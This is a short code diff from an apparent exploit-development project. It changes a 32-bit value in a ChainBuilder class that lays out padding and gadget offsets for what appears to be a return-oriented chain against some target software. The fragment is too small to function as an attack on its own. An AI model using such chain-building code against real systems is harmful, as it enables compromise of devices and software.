@@ -364,7 +364,7 @@ class ChainBuilder {
 			+ Util.pad(0x10, SF)
 			+ Util.int64(0x0, this.offsets.gadgetZMod1)
 			+ Util.pad(0x68, AA)
-			+ Util.int32(0x0)
+			+ Util.int32(0xffffffff)
 		);
 		
 		this.appendChainDataOffset(this.dataOffsets['opdGadgetZ1']);
